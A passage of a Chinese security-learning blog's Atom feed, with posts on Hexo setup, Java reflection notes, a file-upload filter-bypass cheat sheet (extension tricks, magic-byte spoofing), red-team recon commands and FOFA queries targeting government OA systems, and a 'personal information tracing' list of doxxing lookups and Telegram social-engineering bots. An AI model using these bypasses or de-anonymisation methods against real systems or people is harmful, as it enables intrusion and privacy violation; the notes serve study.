src="https://raw.githubusercontent.com/godicee/img/main/0ea58a28964f0337272215a1ce3fc42c.png"></p><h3 id="给出站链接添加nofollo标签"><a href="#给出站链接添加nofollo标签" class="headerlink" title="给出站链接添加nofollo标签"></a>给出站链接添加nofollo标签</h3><p>网络爬虫可能在搜索当前页面的所有链接时，跳到别的网站回不来了。因此，需要nofollow标签发挥作用。<br>nofollow标签是由谷歌领头创新的一个“反垃圾链接”的标签，并被百度、yahoo等各大搜索引擎广泛支持，引用nofollow标签的目的是：用于指示搜索引擎不要追踪（即抓取）网页上带有nofollow属性的任何出站链接，以减少垃圾链接的分散网站权重。</p><p>安装nofollow插件<code>npm install hexo-autonofollow --save</code></p><p>该插件会将博客中的出站链接自动加上nofollow属性，例外请在站点配置文件_config.xml中添加如下字段</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nofollow:</span><br><span class="line">  enable: true</span><br><span class="line">  exclude:</span><br><span class="line"><span class="bullet">  -</span> www.zhihu.com</span><br></pre></td></tr></table></figure><p>然后可以过一天再去 google、bing、baidu 搜索自己的网站<code>site:godice.top</code></p><h3 id="todo"><a href="#todo" class="headerlink" title="todo"></a>todo</h3><ul><li>1 现在国内访问 github 还是偶尔有问题，需要魔法<ul><li>可以做一个 cdn 加速</li></ul></li></ul><h2 id="上传总结"><a href="#上传总结" class="headerlink" title="上传总结"></a>上传总结</h2><p>1 直接用 elog 同步修改后的文章</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">elog sync -e .elog.env</span><br></pre></td></tr></table></figure><p>2 将上传后 elog 自动生成的 font master 复制到语对应文章中，添加分类</p><p>（时间、categories、description 都可以自定义——如果不自定义的话，下次修改后上传又会被覆盖）</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 全网最详细Hexo+next博客搭建&amp;语雀+github图床+elog全自动化上传&amp;SEO优化&amp;各种优化&amp;leancloud+Waline评论系统</span><br><span class="line">urlname: rvzym5p0106de7qi</span><br><span class="line">date: &#x27;2024-12-12 11:24:01&#x27;</span><br><span class="line">updated: &#x27;2024-12-13 10:30:24&#x27;</span><br><span class="line">author: godice</span><br><span class="line">categories: 个人博客搭建</span><br><span class="line">cover: &gt;-</span><br><span class="line">  https://cdn.nlark.com/yuque/0/2024/png/47779600/1733815405874-df3274f4-5621-4c0c-b606-98ba126dad93.png</span><br><span class="line">description: &quot;博客部署：Hexo+next8 部署到 github 并设置自购域名解析个性化配置：超级完整的个性化配置评论系统：leancloud+waline+versel 图床：PicGo+Github\t同步问题：elog（自动化批量上传） SEO 优化\t导航栏配置......参考文档...&quot;</span><br><span class="line"><span class="section">abbrlink: 61389</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>注意：每次重新 <code>hexo g -d</code> 后（如果偶然出现了异常，一般不会）需要去 github 重设一下域名解析。</p><p>可以本地测试<code>hexo server</code></p>]]></content>
    
    
    <summary type="html">博客部署：Hexo+next8 部署到 github 并设置自购域名解析个性化配置：超级完整的个性化配置评论系统：leancloud+waline+versel 图床：PicGo+Github	同步问题：elog（自动化批量上传） SEO 优化	导航栏配置......参考文档...</summary>
    
    
    
    <category term="超详细博客搭建" scheme="http://godice.top/categories/%E8%B6%85%E8%AF%A6%E7%BB%86%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
    
    
  </entry>
  
  <entry>
    <title>index</title>
    <link href="http://godice.top/index.html"/>
    <id>http://godice.top/index.html</id>
    <published>2024-12-11T10:16:41.000Z</published>
    <updated>2025-01-05T10:40:13.000Z</updated>
    
    <content type="html"><![CDATA[<p>目前主要是一些关于安全的书</p><ul><li>《java 安全漫谈》</li><li>《白帽子讲网络安全》</li><li>《The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities》</li><li>《The-hacker-playbook-3-pdf》</li><li>《代码审计企业级 Web 代码安全架构》</li></ul><p><a href="https://github.com/javadevbooks/books">终极详细的超多java&#x2F;python电子书版本</a></p><p><a href="https://github.com/soberqian/Java-Carwler-Technology?tab=readme-ov-file">网络数据采集技术—Java网络爬虫（完整代码）</a></p><p><a href="https://github.com/duoan/codes-scratch-crawler">《自己动手写网络爬虫》实现代码</a></p><p><a href="https://xz.aliyun.com/t/16523?time__1311=GuD=Y5BK7K4BqDwqeqq7qmxfxYqFXioD">jdbc Attack</a></p>]]></content>
    
    
    <summary type="html">目前主要是一些关于安全的书《java 安全漫谈》《白帽子讲网络安全》《The Art of Software Security Assessment - Identifying and Preventing Software Vulnerabilities》《The-hacker-playbo...</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>b站视频学习</title>
    <link href="http://godice.top/b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0.html"/>
    <id>http://godice.top/b%E7%AB%99%E8%A7%86%E9%A2%91%E5%AD%A6%E4%B9%A0.html</id>
    <published>2024-12-10T03:15:40.000Z</published>
    <updated>2024-12-10T03:16:03.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://space.bilibili.com/2142877265/search/video?keyword=java">up主链接</a></p>]]></content>
    
    
    <summary type="html">up主链接</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>一次Telegram窃取程序的深入解析：从技术细节到定位攻击者账户的完整流程</title>
    <link href="http://godice.top/%E4%B8%80%E6%AC%A1Telegram%E7%AA%83%E5%8F%96%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%EF%BC%9A%E4%BB%8E%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%B0%E5%AE%9A%E4%BD%8D%E6%94%BB%E5%87%BB%E8%80%85%E8%B4%A6%E6%88%B7%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B.html"/>
    <id>http://godice.top/%E4%B8%80%E6%AC%A1Telegram%E7%AA%83%E5%8F%96%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90%EF%BC%9A%E4%BB%8E%E6%8A%80%E6%9C%AF%E7%BB%86%E8%8A%82%E5%88%B0%E5%AE%9A%E4%BD%8D%E6%94%BB%E5%87%BB%E8%80%85%E8%B4%A6%E6%88%B7%E7%9A%84%E5%AE%8C%E6%95%B4%E6%B5%81%E7%A8%8B.html</id>
    <published>2024-12-10T03:11:12.000Z</published>
    <updated>2024-12-10T03:11:17.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/16570?time__1311=GuD=YvxGxmrx/GG7DyDI2bNo8s7smeD">一次Telegram窃取程序的深入解析：从技术细节到定位攻击者账户的完整流程</a></p>]]></content>
    
    
    <summary type="html">一次Telegram窃取程序的深入解析：从技术细节到定位攻击者账户的完整流程</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>IoT 安全超详尽入门指南</title>
    <link href="http://godice.top/IoT%20%E5%AE%89%E5%85%A8%E8%B6%85%E8%AF%A6%E5%B0%BD%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html"/>
    <id>http://godice.top/IoT%20%E5%AE%89%E5%85%A8%E8%B6%85%E8%AF%A6%E5%B0%BD%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.html</id>
    <published>2024-12-05T06:51:00.000Z</published>
    <updated>2024-12-10T03:11:13.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/16511?time__1311=GuD=Y5BKiKAIq05DKYYIe7KZA+ucxDkjeD#toc-18">先知社区IoT安全入门指南</a></p>]]></content>
    
    
    <summary type="html">先知社区IoT安全入门指南</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>个人信息溯源</title>
    <link href="http://godice.top/%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E6%BA%AF%E6%BA%90.html"/>
    <id>http://godice.top/%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E6%BA%AF%E6%BA%90.html</id>
    <published>2024-11-25T08:45:18.000Z</published>
    <updated>2024-12-05T06:38:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="%E7%9F%AD%E9%93%BE%E6%8E%A5%E7%94%9F%E6%88%90">https://reurl.cc/main/cn</a></p><p><img src="https://raw.githubusercontent.com/godicee/img/main/bc58a1c0480b98b9eb4f43f384a11fc8.png"></p><h3 id="ip-溯源"><a href="#ip-溯源" class="headerlink" title="ip 溯源"></a>ip 溯源</h3><p><a href="https://www.chaipip.com/">高精度ip查询</a></p><p><a href="https://github.com/xingyunsec/IPTraceabilityTool?tab=readme-ov-file">ip归属查询工具</a></p><h3 id="个人信息溯源"><a href="#个人信息溯源" class="headerlink" title="个人信息溯源"></a>个人信息溯源</h3><h4 id="手机号查信息"><a href="#手机号查信息" class="headerlink" title="手机号查信息"></a>手机号查信息</h4><p><a href="https://privacy.aiuys.com/">个人信息泄露：qq&#x2F;手机&#x2F;身份证&#x2F;邮箱&#x2F;微博（互查，效果一般）</a></p><p><a href="https://zy.xywlapi.cc/emoh.html">查手机号归属&#x2F;qq查绑定账号（微博）</a></p><p>支付宝转账（到对应银行看名字）、微信搜索、钉钉通讯录导入</p><h4 id="telegram-群组"><a href="#telegram-群组" class="headerlink" title="telegram 群组"></a>telegram 群组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空壳bot</span><br><span class="line">星盾-社工机器人</span><br><span class="line">liemo（猎魔）</span><br><span class="line">人查查-定位-....</span><br></pre></td></tr></table></figure><h4 id="github-泄露"><a href="#github-泄露" class="headerlink" title="github 泄露"></a>github 泄露</h4><p>意点击一个 commit 进入</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/7e82249e6448e328acbf36758130f089.png"></p><p>在后面加上.patch</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1733304585715-e3a76c97-cd29-4fd9-93df-28a366a4d65d.png"></p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p><a href="https://reurl.cc/main/cn">短链接生成（xss）</a></p>]]></content>
    
    
    <summary type="html">[https://reurl.cc/main/cnip](https://reurl.cc/main/cnip) 溯源高精度ip查询ip归属查询工具个人信息溯源手机号查信息个人信息泄露：qq/手机/身份证/邮箱/微博（互查，效果一般）查手机号归属/qq查绑定账号（微博）支付宝转账（到对应银行看名字）、微信搜索、钉钉通讯录导入telegram 群组空壳b...</summary>
    
    
    
    <category term="溯源" scheme="http://godice.top/categories/%E6%BA%AF%E6%BA%90/"/>
    
    
  </entry>
  
  <entry>
    <title>溯源</title>
    <link href="http://godice.top/%E6%BA%AF%E6%BA%90.html"/>
    <id>http://godice.top/%E6%BA%AF%E6%BA%90.html</id>
    <published>2024-11-25T08:45:18.000Z</published>
    <updated>2024-12-05T06:38:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="%E7%9F%AD%E9%93%BE%E6%8E%A5%E7%94%9F%E6%88%90">https://reurl.cc/main/cn</a></p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1733307578804-12e2f823-6637-4bd2-802a-86f227630b4b.png"></p><h3 id="ip-溯源"><a href="#ip-溯源" class="headerlink" title="ip 溯源"></a>ip 溯源</h3><p><a href="https://www.chaipip.com/">高精度ip查询</a></p><p><a href="https://github.com/xingyunsec/IPTraceabilityTool?tab=readme-ov-file">ip归属查询工具</a></p><h3 id="个人信息溯源"><a href="#个人信息溯源" class="headerlink" title="个人信息溯源"></a>个人信息溯源</h3><h4 id="手机号查信息"><a href="#手机号查信息" class="headerlink" title="手机号查信息"></a>手机号查信息</h4><p><a href="https://privacy.aiuys.com/">个人信息泄露：qq&#x2F;手机&#x2F;身份证&#x2F;邮箱&#x2F;微博（互查，效果一般）</a></p><p><a href="https://zy.xywlapi.cc/emoh.html">查手机号归属&#x2F;qq查绑定账号（微博）</a></p><p>支付宝转账（到对应银行看名字）、微信搜索、钉钉通讯录导入</p><h4 id="telegram-群组"><a href="#telegram-群组" class="headerlink" title="telegram 群组"></a>telegram 群组</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">空壳bot</span><br><span class="line">星盾-社工机器人</span><br><span class="line">liemo（猎魔）</span><br><span class="line">人查查-定位-....</span><br></pre></td></tr></table></figure><h4 id="github-泄露"><a href="#github-泄露" class="headerlink" title="github 泄露"></a>github 泄露</h4><p>意点击一个 commit 进入</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1733304810586-a6599448-c971-4437-bb14-35d4da75549e.png"></p><p>在后面加上.patch</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/47779600/1733304585715-e3a76c97-cd29-4fd9-93df-28a366a4d65d.png"></p><h3 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h3><p><a href="https://reurl.cc/main/cn">短链接生成（xss）</a></p>]]></content>
    
    
    <summary type="html">https://reurl.cc/main/cnip 溯源高精度ip查询ip归属查询工具个人信息溯源手机号查信息个人信息泄露：qq/手机/身份证/邮箱/微博（互查，效果一般）查手机号归属/qq查绑定账号（微博）支付宝转账（到对应银行看名字）、微信搜索、钉钉通讯录导入telegram 群组空壳b...</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>SEO搜索引擎优化</title>
    <link href="http://godice.top/SEO%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BC%98%E5%8C%96.html"/>
    <id>http://godice.top/SEO%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BC%98%E5%8C%96.html</id>
    <published>2024-11-21T12:21:59.000Z</published>
    <updated>2024-11-21T12:23:11.000Z</updated>
    
    <content type="html"><![CDATA[<p><font style="color:rgba(0, 0, 0, 0.85);">搜索引擎优化（Search Engine Optimization，简称SEO）是一种通过了解搜索引擎的运作规则来提高网站在搜索引擎内排名的方法，从而增加网站的可见度和访问量。这种技术涉及网站结构、内容质量、关键词策略等多个方面。 然而，一些不法分子滥用SEO技术，发展出“黑帽SEO（Black Hat SEO）”，通过欺骗或操纵搜索引擎算法获得不正当排名优势。常见手法包括关键词堆砌、链接农场等，严重影响用户体验和互联网生态。搜索引擎公司持续更新算法以打击这些行为。 在本挑战中，参赛者将在真实的百度搜索引擎中一展身手，运用你的SEO技巧和创意，将你的网页推向搜索结果的顶峰。我们鼓励参赛者探索和应用合法、有效的SEO策略，以提高网页在搜索结果中的排名。通过这场比赛，我们希望参赛者能够深入理解SEO的原理，同时认识到合法的SEO策略对于网站长期发展的重要性。 请注意：本赛题要求选手提前准备好参赛所需使用的域名，并自行进行搜索引擎收录提交尝试，请注意域名格式具体要求详见赛题详情。</font></p>]]></content>
    
    
    <summary type="html">搜索引擎优化（Search Engine Optimization，简称SEO）是一种通过了解搜索引擎的运作规则来提高网站在搜索引擎内排名的方法，从而增加网站的可见度和访问量。这种技术涉及网站结构、内容质量、关键词策略等多个方面。 然而，一些不法分子滥用SEO技术，发展出“黑帽SEO（Blac...</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ToDo-SSTI注入</title>
    <link href="http://godice.top/ToDo-SSTI%E6%B3%A8%E5%85%A5.html"/>
    <id>http://godice.top/ToDo-SSTI%E6%B3%A8%E5%85%A5.html</id>
    <published>2024-11-21T09:05:59.000Z</published>
    <updated>2024-11-21T09:07:39.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/sun1318578251/article/details/105824562">参考文档</a></p>]]></content>
    
    
    <summary type="html">参考文档</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>ToDo-Java安全漫谈</title>
    <link href="http://godice.top/ToDo-Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88.html"/>
    <id>http://godice.top/ToDo-Java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88.html</id>
    <published>2024-11-15T09:49:26.000Z</published>
    <updated>2024-12-05T07:53:27.000Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/phith0n/JavaThings">java安全漫谈github（方便获取demo代码）</a></p><p><a href="https://xz.aliyun.com/t/16423?time__1311=GuD=q+xmxfxRx05DKY4Cq7K1+ajFDk0feD">java反序列化深入剖析与实战</a></p><p><a href="https://xz.aliyun.com/t/16523?time__1311=GuD=Y5BK7K4BqDwqeqkciEoAIq0K3x">jdbc攻击（java数据库连接攻击）</a></p><h2 id="01-反射（1）"><a href="#01-反射（1）" class="headerlink" title="01 反射（1）"></a>01 反射（1）</h2><p>反射：运行时才知道要操作的类具体是什么：程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法</p><p>Java安全：反序列化漏洞——可以从反射开始说起 </p><p>反射是⼤多数语⾔⾥都必不可少的组成部分</p><p>对象通过反射——获取他的类——类通过反射拿到所有⽅法（包括私有）——拿到的⽅法可以调⽤</p><p><font style="color:#DF2A3F;">通过“反射”，可以将Java这种静态语⾔附加上动态特性</font></p><p>“动态特性”——⼀段代码，改变其中的变量，将会导致这段代码产⽣功能性的变化</p><p><font style="color:#DF2A3F;">⽐如：⼀段代码，在你不知道传⼊的参数值的时候，你是不知道他的作⽤是什么的</font></p><h3 id="1java-lang-class"><a href="#1java-lang-class" class="headerlink" title="1java.lang.class"></a>1java.lang.class</h3><ul><li>java.lang.class 是一个重要的类，是 java 反射机制的核心，其允许<ul><li>运行时动态获取类信息</li><li>具体包括：<ul><li>类名、字段（成员变量）、类方法、类构造方法、父类、接口</li></ul></li></ul></li></ul><h4 id="1-1-常用方法"><a href="#1-1-常用方法" class="headerlink" title="1.1 常用方法"></a>1.1 常用方法</h4><ul><li>类</li><li>类的对象：是 Java 的反射机制中，用来表示类的元数据（即关于类的结构、字段、方法等信息）的对象<ul><li>每个类都有一个与之关联的<code>Class</code> 对象，包含了类的信息，如类的名称、方法、字段、构造函数等</li></ul></li><li>类的实例： 是类的具体对象，是类的一个实例化对象（通过调用构造函数创建）<ul><li>实例拥有类的属性和方法，可以执行类定义的行为</li></ul></li></ul><p>在反射中，<code>clazz</code> 是一个 <code>Class</code> 类型的对象，它代表了一个类的信息。你可以通过 <code>Class</code> 对象来获取类的方法、字段、构造函数等。  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public void execute(String className, String methodName) throws Exception &#123;</span><br><span class="line"> Class clazz = Class.forName(className);</span><br><span class="line"> clazz.getMethod(methodName).invoke(clazz.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p><code>Class.forName(&quot;com.example.Hello&quot;);</code>：根据类的完全限定名（包括包名）加载类</p><ul><li>如果不存在会抛异常</li></ul></li><li><p><code>clazz.getMethod(methodName)</code>：获取类的指定<font style="color:#E4495B;">公有</font>方法（只接受方法名，不能携带参数）</p><ul><li>目的是：运行时动态获取类的方法、方便后续的执行(invoke)</li><li><font style="color:#E4495B;">getMethod 可以获取类的 Method 对象</font>，然后可以用 invoke 调用它</li><li>如果不指定方法名会返回一个方法数组：该类的所有公用方法<ul><li><code>Method[] methods = clazz.getMethods();</code></li></ul></li><li><code>clazz.getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</code>：可以携带参数<ul><li>可以获取私有方法</li></ul></li></ul></li><li><p><code>clazz.newInstance()</code>：使用反射创建一个新的类实例&#x3D;调用类的无参构造方法</p></li><li><p><code>.invoke(obj,para)</code>：<font style="color:#E4495B;">是 Method 对象的一个方法</font>，参数是方法调用需要的目标对象&amp;调用方法的参数</p><ul><li>obj：调用哪个对象的该方法</li><li>para：传入的参数数组，可为 null</li></ul></li><li><p>总结：</p><ul><li><code>clazz.getMethod(methodName)</code>通过反射获取了 clazz 类中名为methodName公用方法——得到一个 Method 对象</li><li><code>clazz.newInstance()</code>：通过反射创建类 <code>clazz</code> 的一个新的实例&#x3D;调用类的无参构造方法，创建该类的一个对象。  </li><li><code>invoke(clazz.newInstance())</code>：调用 Method 对象，其是一个名为 <code>methodName</code>的方法。<code>invoke</code> 方法会执行 <code>clazz</code> 类的 <code>methodName</code> 方法，并且在这个方法上使用 <code>clazz.newInstance()</code> 创建的实例作为目标对象。</li></ul></li></ul><h4 id="1-2-获取类对象的方法"><a href="#1-2-获取类对象的方法" class="headerlink" title="1.2 获取类对象的方法"></a>1.2 获取类对象的方法</h4><ul><li><code>obj.getClass()</code>：通过一个实例获取其类对象<ul><li>动态获取</li><li>场景： 有一个对象，并且想知道这个对象是什么类型</li></ul></li><li><code>&lt;font style=&quot;color:rgb(51,51,51);&quot;&gt;Test.class()&lt;/font&gt;</code><font style="color:rgb(51,51,51);"> 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象</font><ul><li><font style="color:rgb(51,51,51);">那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射（效率很高，编译时就知道）</font></li><li><font style="color:rgb(51,51,51);">场景： 这种方式适用于你已经知道某个类的名字，并且在编译时就能确定  </font></li></ul></li><li><code>&lt;font style=&quot;color:rgb(51,51,51);&quot;&gt;Class.forName()&lt;/font&gt;</code><font style="color:rgb(51,51,51);"> 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</font><ul><li><font style="color:rgb(51,51,51);">通过完全限定名动态获取</font></li><li><font style="color:rgb(51,51,51);">场景：当你在运行时才知道类的名称，或者类名是动态提供的  </font></li></ul></li></ul><p><font style="color:#DF2A3F;"></font></p><h3 id="3-沙盒绕过-ctf-例题"><a href="#3-沙盒绕过-ctf-例题" class="headerlink" title="3 沙盒绕过 ctf 例题"></a>3 沙盒绕过 ctf 例题</h3><p><a href="http://rui0.cn/archives/1015">Code-Breaking2018沙盒绕过</a></p><h3 id="4forName-重载"><a href="#4forName-重载" class="headerlink" title="4forName 重载"></a>4forName 重载</h3><p>使用 <code>forName()</code>会自动初始化该 Class 对象</p><ul><li><p>forName有两个函数重载：</p><ul><li><code>Class&lt;?&gt; forName(String name)</code><ul><li>第⼀个就是常⻅获取class的⽅式，可以理解为第⼆种⽅式的封装</li><li>等价于：</li><li><code>Class.forName(name, true, Thread.currentThread().getContextClassLoader());</code></li></ul></li><li><code>Class&lt;?&gt; forName(String name, **boolean** initialize, ClassLoader loader)</code><ul><li>第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就是 ClassLoader </li><li>ClassLoader就是⼀个“加载器”，告诉Java虚拟机如何加载这个类</li><li>Java默认的 ClassLoader 就是根据类名来加载类（类名需要是完整路径）</li></ul></li></ul></li><li><p><font style="color:#DF2A3F;">加载和初始化</font></p><ul><li>加载：把类的.class 文件加载到 JVM 内容，Class 对象已被创建</li><li>初始化：执行类的静态代码块，和静态变量（在类加载时执行，且只执行一次）</li><li>加载但不初始化好处：<ul><li>1 反射：用 ClassLoader 加载类，获取其元信息、无需执行其静态代码块。<ul><li>eg：加载一个工具类，只需要调用方法，但不需要执行其静态代码</li></ul></li><li>2 性能优化、延迟加载、避免静态代码被执行…</li></ul></li></ul></li></ul><h3 id="forName-与-class"><a href="#forName-与-class" class="headerlink" title="forName 与 .class"></a>forName 与 .class</h3>]]></content>
    
    
    <summary type="html">java安全漫谈github（方便获取demo代码）java反序列化深入剖析与实战jdbc攻击（java数据库连接攻击）01 反射（1）反射：运行时才知道要操作的类具体是什么：程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法Java安全：反序列化漏洞——可以从反射开始说起 ...</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>文件上传绕过总结</title>
    <link href="http://godice.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html"/>
    <id>http://godice.top/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93.html</id>
    <published>2024-11-15T01:54:35.000Z</published>
    <updated>2025-01-17T08:36:34.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">加后缀</span><br><span class="line"></span><br><span class="line">file.Php   大小写绕过</span><br><span class="line">file.php::$DATA</span><br><span class="line">file.Php</span><br><span class="line">file.php+</span><br><span class="line">file.php.   （多少个 . 都可以）</span><br><span class="line">file.php%80-90</span><br><span class="line">file.php+</span><br><span class="line">file.php.+.+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">黑名单</span><br><span class="line">替换绕过</span><br><span class="line">.phphp p</span><br><span class="line">file.pphphp</span><br><span class="line">定义不全</span><br><span class="line">php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml</span><br><span class="line"></span><br><span class="line">文件幻术</span><br><span class="line">GIF89a?</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">加后缀  file.Php   大小写绕过 file.php::$DATA file.Php file.php+ file.php.   （多少个 . 都可以） file.php%80-90 file.php+ file.php.+.+   黑名单 替换绕过 .phphp p file.pph...</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>RT基础</title>
    <link href="http://godice.top/RT%E5%9F%BA%E7%A1%80.html"/>
    <id>http://godice.top/RT%E5%9F%BA%E7%A1%80.html</id>
    <published>2024-11-05T14:12:28.000Z</published>
    <updated>2024-11-07T09:59:55.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="打点基础"><a href="#打点基础" class="headerlink" title="打点基础"></a>打点基础</h2><h3 id="1-攻击流程"><a href="#1-攻击流程" class="headerlink" title="1 攻击流程"></a>1 攻击流程</h3><p><img src="https://raw.githubusercontent.com/godicee/img/main/3b56fcba256a278c0fc1242b75a81af1.png"></p><h3 id="2-主动信息收集"><a href="#2-主动信息收集" class="headerlink" title="2 主动信息收集"></a>2 主动信息收集</h3><p>找资产：主域、小程序（关键字去搜）、公众号</p><p>写拓扑（递归）——搜索引擎找主域——由点到线到面</p><p>子域、端口（服务）、目录…</p><p>增大攻击面：域名解析记录（以前解析到的 ip，看还有没有在用）</p><p>(建议信息收集：用多种工具、最后去重)</p><p>网站使用语言</p><ul><li><font style="color:#DF2A3F;">php、c#、asp 好打</font><ul><li>c#很多 sql 注入（数据库一般用的 mssql）<ul><li>有堆叠 sql 就能 getshell</li></ul></li><li>php——mysql</li><li>aps——sqlserver（mssql）微软自己的，免费</li></ul></li><li><font style="color:#DF2A3F;">java、jsp难打：放后面</font><ul><li>java：mysql</li><li>jsp：oracle&#x2F;mysql——oracle 收费且很贵，一般是大公司用</li></ul></li></ul><p><font style="color:#DF2A3F;"></font></p><p><font style="color:#DF2A3F;"></font></p><p>（历史漏洞和代码审计）</p><ul><li>CMS 识别<ul><li>php：thinkphp</li><li>CMS 开源网站、售卖网站…</li></ul></li><li>指纹识别：Wrappr<ul><li>云悉</li><li>fofa：ip 聚合（左下角，web 版）</li><li>ehole：把 c 段的所有资产做一个指纹识别</li></ul></li><li>直接搜相关洞都打一遍</li><li>也可以下载源码下来审计</li></ul><p>扫目录（备份文件）</p><p>Ehole：通过 c 段来识别（列出 c 段中的所有资产）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ehole -f xxx.xxx.xxx.xxx/24</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/godicee/img/main/d7ffba72b11f8e4c0210c47098a26aa3.png"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fofa搜cms</span><br><span class="line">app=&quot;泛微-协同办公OA&quot;    政府用的很多的</span><br><span class="line">泛微、通达、致远</span><br><span class="line">title=&quot;后台管理&quot;</span><br><span class="line">yapi（可视化平台，洞很多）</span><br></pre></td></tr></table></figure><h3 id="3-被动信息收集"><a href="#3-被动信息收集" class="headerlink" title="3 被动信息收集"></a>3 被动信息收集</h3><p>（不主动和站点交互——fofa、云悉等第三方接口）</p><p><img src="https://raw.githubusercontent.com/godicee/img/main/3dff13c17642390d2ae8a629cb7ea157.png"></p><h4 id="3-1google-语法"><a href="#3-1google-语法" class="headerlink" title="3.1google 语法"></a>3.1google 语法</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">filetype:pdf site:.qq.com   qq.com域名结尾的pdf文件</span><br><span class="line">intitle:标题含有指定内容的网页</span><br><span 